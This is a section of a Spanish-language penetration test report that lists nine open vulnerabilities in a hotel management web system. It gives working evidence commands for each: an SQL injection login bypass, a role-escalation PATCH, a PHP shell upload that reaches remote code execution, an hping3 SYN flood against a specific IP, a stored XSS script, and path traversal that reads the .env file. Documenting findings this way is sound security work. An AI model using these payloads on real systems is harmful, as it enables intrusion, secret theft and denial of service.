## VII. ANÁLISIS DE VULNERABILIDADES

Tras realizar las pruebas de penetración sobre el sistema Hotel PlazaMoyobamba, se detectaron las siguientes vulnerabilidades listadas en la tabla adjunta:

| Vulnerabilidad | Severidad | Herramienta usada | Evidencia | Estado |
|---|---|---|---|---|
| Inyección SQL (SQLi) | Crítica | sqlmap / curl / SQLi manual | `curl -X POST /login -d "login=admin' OR '1'='1' --"` → redirección al dashboard admin (302). Se logró bypass completo de autenticación sin conocer la contraseña. | Abierto |
| Mass Assignment | Alta | Burp Scanner / curl / PATCH role_name | `curl -X PATCH /profile -d "role_name=admin"` → el usuario normal obtiene rol admin y accede a `/admin/dashboard` con HTTP 200. | Abierto |
| File Upload → RCE | Crítica | Burp Suite / curl + Python reverse shell | `curl -F "file=@shell.php" /upload` → shell subida a `/uploads/shell.php`. Ejecución de `uname -a` confirmada. RCE completo como www-data. | Abierto |
| DDoS (Falta de protección) | Media | hping3 / slowhttptest / curl | `hping3 -S --flood --rand-source -p 80 37.60.230.11` → 1603 requests en 30.5 segundos, 0 errores, throughput 52.6 req/s. Servidor no limitó el tráfico. | Abierto |
| XSS Almacenado | Alta | OWASP ZAP / navegador / payload script | `POST /profile` con bio=`<script>alert('XSS')</script>`. Al visualizar el perfil, el script se ejecuta en el navegador de cualquier usuario que visite la página. | Abierto |
| IDOR (Referencia Directa Insegura) | Alta | Burp Suite Autorize / curl | `curl http://host/api/sales/1` → retorna JSON completo con datos de la venta, items, cliente y habitaciones, sin necesidad de autenticación. | Abierto |
| No Rate Limit en Login | Media | hydra / wfuzz / curl | `for i in {1..100}; do curl -X POST /login -d "login=test&password=x"; done` → 100 intentos seguidos sin bloqueo ni retardo. | Abierto |
| Local File Inclusion (LFI) | Alta | dotdotpwn / wfuzz / curl | `curl /download?file=../../../../.env` → contenido del archivo `.env` expuesto en la respuesta HTTP. | Abierto |
| Debug Mode Activado | Media | whatweb / navegador | `curl /ruta-inexistente` → página de error con stack trace completo, rutas del servidor, variables de entorno y consultas SQL visibles. | Abierto |